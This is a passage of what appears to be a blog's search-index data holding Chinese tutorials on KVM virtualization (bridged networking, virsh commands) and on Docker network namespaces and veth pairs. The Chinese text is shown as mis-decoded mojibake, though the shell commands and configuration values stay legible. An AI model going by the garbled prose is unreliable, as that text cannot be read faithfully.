ç«¯å£è¿æ¥åˆ°ç½‘æ¡¥ä¸Šï¼Œå¹¶é…ç½®ç«¯å£ä¸åŒçš„VLAN tagä»¥è¾¾åˆ°éš”ç¦»å’Œäº’è”çš„ç›®çš„ã€‚\nNATæ¨¡å¼å’Œä¸»æœºæ¨¡å¼éƒ½æ— éœ€å•ç‹¬é…ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•é…ç½®æ¡¥æ¥ç½‘ç»œã€‚\né…ç½®æ¡¥æ¥ç½‘ç»œ ç‰©ç†ç½‘å¡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šä¹‹åå°±ä¼šå¯¼è‡´ç½‘ç»œæ–­å¼€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠåŸIPé…ç½®åˆ°ç½‘æ¡¥ä¸Šã€‚\n# è¿›å…¥ç½‘å¡é…ç½®æ–‡ä»¶å¤¹ cd /etc/sysconfig/network-scripts/ # æ‹·è´åŸç½‘å¡é…ç½®æ–‡ä»¶ä½œä¸ºæ¡¥æ¥ç½‘å¡ cp ifcfg-enp134s0f0 ifcfg-br0 ä¿®æ”¹ ifcfg-br0 ä¸­çš„ TYPE=Ethernet ä¸º TYPE=Bridgeï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\nDEVICE=br0 ONBOOT=yes BOOTPROTO=none TYPE=Bridge IPADDR=172.16.0.52 PREFIX=16 GATEWAY=172.16.0.1 DNS1=114.114.114.114 ä¿®æ”¹ifcfg-enp134s0f0 æ–‡ä»¶åˆ é™¤å…¶ä¸­çš„ IPADDR= NETMASK= GATEWAY= è¡Œï¼Œå¹¶åœ¨æœ€åæ·»åŠ ä¸ŠBRIDGE=br0ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\nDEVICE=\u0026#34;enp134s0f0\u0026#34; ONBOOT=yes BOOTPROTO=none TYPE=Ethernet BRIDGE=br0 æœ€åé‡å¯ç½‘ç»œã€‚\nsystemctl restart network æŸ¥çœ‹ç½‘ç»œä¿¡æ¯ä¹Ÿå¯ä»¥çœ‹åˆ°IPé…ç½®åˆ°äº†ç½‘æ¡¥ä¸Šï¼Œç½‘æ¡¥ä¸Šåˆå…³è”äº†ç‰©ç†ç½‘å¡ã€‚\n[root@localhost network-scripts]# ip a 8: enp134s0f0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq master br0 state UP group default qlen 1000 link/ether 74:a4:b5:01:04:22 brd ff:ff:ff:ff:ff:ff inet6 fe80::76a4:b5ff:fe01:422/64 scope link valid_lft forever preferred_lft forever 17: br0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 74:a4:b5:01:04:22 brd ff:ff:ff:ff:ff:ff inet 172.16.0.52/16 brd 172.16.255.255 scope global br0 valid_lft forever preferred_lft forever inet6 fe80::76a4:b5ff:fe01:422/64 scope link valid_lft forever preferred_lft forever [root@localhost network-scripts]# brctl show bridge name bridge id STP enabled interfaces br0 8000.74a4b5010422 no enp134s0f0 åˆ›å»ºè™šæ‹Ÿæœº åˆ›å»ºè™šæ‹Ÿæœºæœ‰ä¸‰ç§é€‰æ‹©\nvirt-install ä½¿ç”¨å‘½ä»¤åˆ›å»ºè™šæ‹Ÿæœºè¾ƒä¸ºæ–¹ä¾¿å¿«æ·ï¼Œä½†å¯¹æ–°æ‰‹ä¸å‹å¥½ï¼Œå¾ˆå¤šå‚æ•°ä¸çŸ¥é“å¦‚ä½•è®¾ç½®ã€‚ Libvirt ä½¿ç”¨libvirtæä¾›çš„apiæ¥å£è¿›è¡Œåˆ›å»ºï¼Œæ­¤ç§æ–¹å¼å¼€å‘è™šæ‹ŸåŒ–å¹³å°ä¼šç”¨åˆ°ã€‚ virt-manager ä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢åˆ›å»ºè™šæ‹Ÿæœºï¼Œæ­¤ç§æ–¹å¼è¾ƒä¸ºç®€å•ï¼Œåªè¦ä¼šç”¨vmwareï¼Œå°±ä¼šç”¨virt-managerã€‚ å› æ­¤æˆ‘æ¯”è¾ƒæ¨èä½¿ç”¨virt-manageræ¥åˆ›å»ºè™šæ‹Ÿæœºï¼Œè¿‡ç¨‹å¾ˆç®€å•ï¼Œæˆ‘å°±ä¸å‘æˆªå›¾äº†ã€‚\nç®¡ç†è™šæ‹Ÿæœº æ“ä½œè™šæ‹Ÿæœºçš„ä¸€äº›å¸¸ç”¨å‘½ä»¤\n# åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è™šæ‹Ÿæœº virsh list # åˆ—å‡ºå…¨éƒ¨çš„è™šæ‹Ÿæœº virsh list --all # å¯åŠ¨è™šæ‹Ÿæœº virsh start test # å…³é—­è™šæ‹Ÿæœº virsh shutdown test # å¼ºåˆ¶åœæ­¢è™šæ‹Ÿæœº virsh destroy test # å½»åº•é”€æ¯è™šæ‹Ÿæœºï¼Œä¼šåˆ é™¤è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶ï¼Œä½†ä¸ä¼šåˆ é™¤è™šæ‹Ÿç£ç›˜ virsh undefine test # è®¾ç½®å®¿ä¸»æœºå¼€æœºæ—¶è¯¥è™šæ‹Ÿæœºä¹Ÿå¼€æœº virsh autostart test # è§£é™¤å¼€æœºå¯åŠ¨ virsh autostart --disable test # æŒ‚èµ·è™šæ‹Ÿæœº virsh suspend test # æ¢å¤æŒ‚èµ·çš„è™šæ‹Ÿæœº virsh resume test # æŸ¥çœ‹è™šæ‹Ÿæœºçš„VNCç«¯å£ï¼Œå¾—åˆ°vncç«¯å£ä¹‹åå¯ä»¥ä½¿ç”¨vncviewerç­‰å·¥å…·è®¿é—®è™šæ‹Ÿæœº virsh vncdisplay test # å¯¼å‡ºè™šæ‹Ÿæœºxmlé…ç½®æ–‡ä»¶ virsh dumpxml test \u0026gt;/root/test.xml # ä¿®æ”¹è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶ virsh edit test å‚è€ƒ https://blog.51cto.com/changfei/1672147\n","permalink":"https://www.typesafe.cn/posts/linux-kvm/","summary":"\u003cp\u003eåœ¨Windowså¹³å°ä¸Šæˆ‘ä»¬ä¹ æƒ¯äºä½¿ç”¨VmWareæˆ–è€…virtual boxæ¥å®ç°è™šæ‹ŸåŒ–ï¼Œè™½ç„¶å®ƒä»¬æ‹¥æœ‰Linuxç‰ˆæœ¬ï¼Œä½†å¤§å¤šæ•°ä¼ä¸šéƒ½é€‰æ‹©äº†ä½¿ç”¨KVMæ¥åšLinuxå¹³å°çš„è™šæ‹ŸåŒ–ï¼Œå› æ­¤å­¦ä¹ æŒæ¡KVMæ˜¯ä¸€é¡¹å¿…ä¸å¯å°‘çš„æŠ€èƒ½ã€‚\u003c/p\u003e\n\u003ch3 id=\"å®‰è£…kvm\"\u003eå®‰è£…KVM\u003c/h3\u003e\n\u003cp\u003eä»¥centosä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯å®‰è£…KVMè™šæ‹ŸåŒ–çš„å‘½ä»¤ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eyum install -y qemu-kvm libvirt virt-install bridge-utils\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eè¿™ä¹ˆå¤šè½¯ä»¶éƒ½æ˜¯ä»€ä¹ˆä½œç”¨ï¼Ÿ\u003c/strong\u003e\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eè½¯ä»¶\u003c/th\u003e\n          \u003cth\u003eä½œç”¨\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eqemu-kvm\u003c/td\u003e\n          \u003ctd\u003eæ•´åˆäº†QEMU å’Œ KVM çš„ä¸€ä¸ªè½¯ä»¶ã€‚\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003elibvirt\u003c/td\u003e\n          \u003ctd\u003eå°è£…äº†QEMUçš„æ¥å£ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ“ä½œè™šæ‹Ÿæœºï¼Œå¹¶ä¸”æä¾›äº†å¾ˆå¤šç§ç¼–ç¨‹è¯­è¨€çš„SDKã€‚\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003evirt-install\u003c/td\u003e\n          \u003ctd\u003eç”¨æ¥åˆ›å»ºè™šæ‹Ÿæœºçš„å‘½ä»¤è¡Œå·¥å…·ã€‚\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebridge-utils\u003c/td\u003e\n          \u003ctd\u003eLinuxç½‘æ¡¥ï¼Œç”¨æ¥é…ç½®è™šæ‹Ÿæœºçš„æ¡¥æ¥ç½‘ç»œã€‚\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003ekvmã€qemuã€qemu-kvmå’Œlibvirtåˆ°åº•æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eKVMï¼ˆKernel Virtual Machineï¼‰æ˜¯Linuxçš„ä¸€ä¸ªå†…æ ¸é©±åŠ¨æ¨¡å—ï¼Œå®ƒéœ€è¦CPUçš„æ”¯æŒï¼Œé‡‡ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯Intel-VTã€AMD-Vï¼›å†…å­˜ç›¸å…³å¦‚Intelçš„EPTå’ŒAMDçš„RVIæŠ€æœ¯ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿè®©Linuxä¸»æœºæˆä¸ºä¸€ä¸ªHypervisorï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ã€‚\u003c/p\u003e\n\u003cp\u003eQEMUæ˜¯ä¸€ä¸ªçº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿæœºï¼Œå®ƒå¯ä»¥æ¨¡æ‹ŸCPUã€å†…å­˜ã€ç£ç›˜ç­‰å…¶ä»–ç¡¬ä»¶ï¼Œè®©è™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±åº•å±‚å°±æ˜¯ç¡¬ä»¶ï¼Œå…¶å®è¿™äº›éƒ½æ˜¯QEMUæ¨¡æ‹Ÿçš„ï¼Œè™šæ‹Ÿæœºçš„æ‰€æœ‰æ“ä½œéƒ½è¦ç»è¿‡QEMUè½¬è¯‘ä¸€å±‚ï¼Œä¹Ÿå°±å¯¼è‡´äº†QEMUæœ¬èº«çš„æ€§èƒ½è¾ƒå·®ã€‚\u003c/p\u003e\n\u003cp\u003eqemu-kvmæ˜¯QEMUæ•´åˆäº†KVMï¼ŒæŠŠCPUè™šæ‹ŸåŒ–å’Œå†…å­˜è™šæ‹ŸåŒ–äº¤ç»™äº†KVMæ¥åšï¼Œè‡ªå·±æ¥æ¨¡æ‹ŸIOè®¾å¤‡ï¼Œä¾‹å¦‚ç½‘å¡å’Œç£ç›˜ã€‚è¿™ä¸€å¥—ç»„åˆæ‹³æ‰“ä¸‹æ¥ï¼Œæ€§èƒ½æŸå¤±å¤§å¤§é™ä½ï¼Œç›¸è¾ƒäºç›´æ¥ä½¿ç”¨ç¡¬ä»¶ï¼Œå¸¦æ¥çš„æŸè€—å¤§æ¦‚åœ¨1%-2%ä¹‹é—´ã€‚\u003c/p\u003e\n\u003cp\u003elibvirtæ˜¯ç›®å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„å¯¹KVMè™šæ‹Ÿæœºè¿›è¡Œç®¡ç†çš„å·¥å…·å’ŒAPIã€‚Libvirtdæ˜¯ä¸€ä¸ªdaemonè¿›ç¨‹ï¼Œå¯ä»¥è¢«æœ¬åœ°çš„virshè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«è¿œç¨‹çš„virshè°ƒç”¨ï¼ŒLibvirtdè°ƒç”¨qemu-kvmæ“ä½œè™šæ‹Ÿæœºã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eå¯åŠ¨libvirt\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl start libvirtd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable libvirtd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœä½ ä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æ¥ç®¡ç†è™šæ‹Ÿæœºï¼Œå¯ä»¥å®‰è£… virt-manager ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y virt-manager\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨æ”¯æŒx11è½¬å‘çš„sshå®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ï¼š\u003ca href=\"https://mobaxterm.mobatek.net/\"\u003eMobaXterm\u003c/a\u003eï¼‰ä¸Šå¯ä»¥ç›´æ¥è¾“å…¥ virt-manager æ¥å¯åŠ¨ã€‚\u003c/p\u003e\n\u003ch3 id=\"è™šæ‹Ÿç½‘ç»œç±»å‹\"\u003eè™šæ‹Ÿç½‘ç»œç±»å‹\u003c/h3\u003e\n\u003cp\u003eå’Œvmwareç±»å‹ï¼Œkvmä¹Ÿæ”¯æŒå¤šç§ç±»å‹çš„ç½‘ç»œï¼Œä¸»è¦åˆ†ä¸ºä¸‰ç§ã€‚\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNATæ¨¡å¼\u003c/strong\u003e è™šæ‹Ÿæœºéœ€è¦æŠŠæµé‡å‘é€åˆ°å®¿ä¸»æœºï¼Œå®¿ä¸»æœºå™¨è½¬æ¢ç½‘ç»œä¿¡æ¯åå†å‘å‡ºï¼Œå¤–éƒ¨æœºå™¨æ— æ³•æ„ŸçŸ¥åˆ°è™šæ‹Ÿæœºçš„å­˜åœ¨ã€‚æ­¤ç§æ–¹å¼å®¿ä¸»æœºå™¨ç›¸å½“äºä¸€ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤å®¿ä¸»æœºä¸Šä¼šæœ‰ä¸€ä¸ªå’Œè™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå¹¶ä¸”è™šæ‹Ÿæœºçš„ç½‘å…³åœ°å€æ˜¯å®¿ä¸»æœºçš„è¿™ä¸ªIPã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eä¸»æœºæ¨¡å¼\u003c/strong\u003e è™šæ‹Ÿæœºåªèƒ½äº’ç›¸è®¿é—®ï¼Œä¸èƒ½è®¿é—®å®¿ä¸»æœºã€‚æ­¤ç§æ–¹å¼ä¸NATæ¨¡å¼ç±»ä¼¼ï¼Œä½†å®ƒæ²¡æœ‰ä¸è™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå› æ­¤è™šæ‹Ÿæœºä¹Ÿä¸èƒ½å€ŸåŠ©äºå®¿ä¸»æœºæ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eæ¡¥æ¥æ¨¡å¼\u003c/strong\u003e è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºéƒ½å…³è”åœ¨ä¸€ä¸ªç½‘æ¡¥ä¸Šï¼Œå› æ­¤è™šæ‹Ÿæœºå¯ä»¥ä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¹¶ä¸”å¤–éƒ¨æœºå™¨å¯ä»¥ç›´æ¥è®¿é—®åˆ°è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹Ÿå¯ä»¥å€ŸåŠ©ç½‘æ¡¥æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eè¿˜æœ‰ä¸€ç§æ¨¡å¼åœ¨openstackç­‰äº‘å¹³å°ä¸Šä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œç½‘æ¡¥ä¸Šç»‘å®šçš„ç‰©ç†ç½‘å¡æ²¡æœ‰IPï¼Œå¯¹åº”äº¤æ¢æœºé…ç½®ç«¯å£ä¸ºtrunkæ¨¡å¼ï¼Œè™šæ‹Ÿæœº ç«¯å£è¿æ¥åˆ°ç½‘æ¡¥ä¸Šï¼Œå¹¶é…ç½®ç«¯å£ä¸åŒçš„VLAN tagä»¥è¾¾åˆ°éš”ç¦»å’Œäº’è”çš„ç›®çš„ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eNATæ¨¡å¼å’Œä¸»æœºæ¨¡å¼éƒ½æ— éœ€å•ç‹¬é…ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•é…ç½®æ¡¥æ¥ç½‘ç»œã€‚\u003c/p\u003e\n\u003ch3 id=\"é…ç½®æ¡¥æ¥ç½‘ç»œ\"\u003eé…ç½®æ¡¥æ¥ç½‘ç»œ\u003c/h3\u003e\n\u003cp\u003eç‰©ç†ç½‘å¡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šä¹‹åå°±ä¼šå¯¼è‡´ç½‘ç»œæ–­å¼€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠåŸIPé…ç½®åˆ°ç½‘æ¡¥ä¸Šã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# è¿›å…¥ç½‘å¡é…ç½®æ–‡ä»¶å¤¹\ncd /etc/sysconfig/network-scripts/\n# æ‹·è´åŸç½‘å¡é…ç½®æ–‡ä»¶ä½œä¸ºæ¡¥æ¥ç½‘å¡\ncp ifcfg-enp134s0f0 ifcfg-br0\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹ \u003ccode\u003eifcfg-br0\u003c/code\u003e ä¸­çš„ \u003ccode\u003eTYPE=Ethernet\u003c/code\u003e  ä¸º \u003ccode\u003e TYPE=Bridge\u003c/code\u003eï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\u003c/p\u003e","title":"Linuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM"},{"content":"ä¹‹å‰æˆ‘ä»¬ä»‹ç»Network Namespaceï¼ˆä»¥ä¸‹ç®€ç§°netnsï¼‰å’Œveth pairæ—¶è¯´è¿‡dockeræ˜¯ä½¿ç”¨è¿™äº›æŠ€æœ¯æ¥å®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥ä¸€æ¢ç©¶ç«Ÿï¼Œçœ‹ä¸‹dockeråˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„ã€‚\nå¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨ é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ --net=none å‚æ•°å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†centosé•œåƒã€‚\ndocker run -itd --name centos-test --net=none centos å¯åŠ¨æˆåŠŸä¹‹åæˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ç¡®è®¤ä¸€ä¸‹æ˜¯å¦æ— ç½‘å¡ã€‚\n[root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28dc2e8853df centos \u0026#34;/bin/bash\u0026#34; 24 seconds ago Up 23 seconds centos-test [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever å¯ä»¥çœ‹åˆ°ç¡®å®åªæœ‰ä¸€ä¸ªæœ¬åœ°ç¯å›ç½‘å¡ã€‚\nå¦‚ä½•æŸ¥çœ‹dockerå¯¹åº”çš„netnsï¼Ÿ å½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œdockerå†…éƒ¨ä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªå®¹å™¨åˆ›å»ºä¸€ä¸ªnetnsç”¨äºç½‘ç»œéš”ç¦»ï¼Œä½†å½“æˆ‘ä»¬ä½¿ç”¨ ip netns list æŸ¥çœ‹æ—¶å´çœ‹ä¸åˆ°ä»»ä½•æ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºdockeræŠŠ netns åˆ›å»ºåœ¨äº†å…¶ä»–åœ°æ–¹ï¼Œè€Œip netns listå‘½ä»¤åªèƒ½è¯»ç›®å½•/var/run/netnsä¸‹é¢çš„æ•°æ®ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ–¹ä¾¿æˆ‘ä»¬å­¦ä¹ dockerç½‘ç»œã€‚\n# å¾—åˆ°å®¹å™¨å¯¹åº”çš„è¿›ç¨‹ pid=docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026#34;$container_id\u0026#34; # æ‰‹åŠ¨åˆ›å»ºé˜²æ­¢æ–‡ä»¶å¤¹ä¸å­˜åœ¨ mkdir -p /var/run/netns/ # å»ºç«‹è½¯è¿æ¥ ln -s /proc/$pid/ns/net /var/run/netns/$container_id å°†ä¸Šé¢çš„å‘½ä»¤ä¿®æ”¹ä¸ºå’Œå½“å‰ç¯å¢ƒä¸€è‡´å¹¶éªŒè¯netnsä¸­çš„ç½‘å¡ã€‚\n[root@localhost ~]# docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026#34;28dc2e8853df\u0026#34; 123624 [root@localhost ~]# mkdir -p /var/run/netns/ [root@localhost ~]# ln -s /proc/123624/ns/net /var/run/netns/28dc2e8853df [root@localhost ~]# ip netns list 28dc2e8853df [root@localhost ~]# ip netns exec 28dc2e8853df ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸè¾“å‡ºäº†netnsä¸­çš„ç½‘å¡ä¿¡æ¯ï¼Œå¹¶ä¸”æ­¤ä¿¡æ¯å’Œä»dockerå®¹å™¨ä¸­çœ‹åˆ°çš„ä¸€è‡´ã€‚\nç»™dockeræ·»åŠ ç½‘å¡ å‚è€ƒå‰é¢çš„Linux Bridgeç« èŠ‚ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååˆ›å»ºä¸€å¯¹veth pairï¼Œä¸€ç«¯è¿æ¥åˆ°ç½‘æ¡¥ï¼Œä¸€ç«¯ç§»åŠ¨åˆ°dockerå¯¹åº”çš„netnsä¸­ã€‚\n# æ·»åŠ ç½‘æ¡¥ brctl addbr br0 # å¯åŠ¨ç½‘æ¡¥ ip link set br0 up # æ–°å¢ä¸€å¯¹veth ip link add veth0-ns type veth peer name veth0-br # å°†vethçš„ä¸€ç«¯ç§»åŠ¨åˆ°dockerå¯¹åº”çš„netnsä¸­ ip link set veth0-ns netns 28dc2e8853df # å°†netnsä¸­çš„æœ¬åœ°ç¯å›å’Œvethå¯åŠ¨å¹¶é…ç½®IP ip netns exec 28dc2e8853df ip link set lo up ip netns exec 28dc2e8853df ip link set veth0-ns up ip netns exec 28dc2e8853df ip addr add 10.0.0.1/24 dev veth0-ns # å°†vethçš„å¦ä¸€ç«¯å¯åŠ¨å¹¶æŒ‚è½½åˆ°ç½‘æ¡¥ä¸Š ip link set veth0-br up brctl addif br0 veth0-br æœ€åéªŒè¯netnså’Œdockerå®¹å™¨ä¸­çš„ç½‘å¡ä¿¡æ¯ã€‚\n[root@localhost ~]# ip netns exec 28dc2e8853df ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 91: veth0-ns@if90: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 86:29:e6:0a:2a:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.1/24 scope global veth0-ns valid_lft forever preferred_lft forever [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 91: veth0-ns@if90: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 86:29:e6:0a:2a:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.1/24 scope global veth0-ns valid_lft forever preferred_lft forever å¯ä»¥çœ‹å‡ºæˆ‘ä»¬åœ¨netnsä¸­æ·»åŠ çš„ç½‘å¡åœ¨dockerå®¹å™¨ä¸­ä¹Ÿå¯ä»¥æ­£ç¡®çš„æ˜¾ç¤ºå‡ºæ¥ï¼Œç”±æ­¤è¯æ˜äº†æ­¤netnså’Œdockerå®¹å™¨çš„å¯¹åº”å…³ç³»ã€‚å½“æˆ‘ä»¬ä½¿ç”¨dockerå‘½ä»¤æ¥åˆ›å»ºå®¹å™¨æ—¶ï¼Œdockerä¸ºæˆ‘ä»¬éšè—äº†å¤§é‡ç»†èŠ‚ï¼Œè½»æ¾ä½¿ç”¨å‡ æ¡å‘½ä»¤ä¾¿åˆ›å»ºå¥½äº†å®¹å™¨ï¼Œä½†è¿™ç§åªçŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶çš„æ–¹å¼å¯¹äºæˆ‘ä»¬æŒæ¡dockerå¹¶ä¸å¤Ÿï¼Œåªæœ‰äº†è§£äº†åº•å±‚åŸç†ä¹‹åæ‰èƒ½å¯¹å…¶åŠŸèƒ½æŒæ¡çš„æ›´åŠ æ·±å…¥ã€‚\nç†è§£dockerçš„å‡ ç§ç½‘ç»œæ¨¡å¼ äº†è§£äº†dockeræ·»åŠ ç½‘å¡çš„åŸç†åå†æ¥ç†è§£dockerçš„å‡ ç§ç½‘ç»œæ¨¡å¼å°±ååˆ†ç®€å•æ˜äº†äº†ï¼Œä¸»è¦åŒºåˆ«å°±åœ¨äºæ˜¯å¦å…·æœ‰ç‹¬ç«‹çš„netnsã€‚\nç½‘ç»œæ¨¡å¼ ç®€ä»‹ bridge å®¹å™¨å…·æœ‰ç‹¬ç«‹çš„netnsï¼Œä¼šå°†å®¹å™¨è¿æ¥åˆ° docker0 è™šæ‹Ÿç½‘æ¡¥ï¼Œå¹¶é…ç½®IPåœ°å€ï¼Œé»˜è®¤ä¸ºè¯¥æ¨¡å¼ã€‚ host å®¹å™¨æ²¡æœ‰ç‹¬ç«‹çš„netnsï¼Œå’Œå®¿ä¸»æœºå…±ç”¨ç½‘ç»œã€‚ none å®¹å™¨å…·æœ‰ç‹¬ç«‹çš„netnsï¼Œä½†å¹¶æ²¡æœ‰å¯¹å…¶è¿›è¡Œä»»ä½•ç½‘ç»œè®¾ç½®ã€‚ container å®¹å™¨å’ŒæŸä¸€ä¸ªå·²å­˜åœ¨çš„å®¹å™¨å…±äº«netnsã€‚ 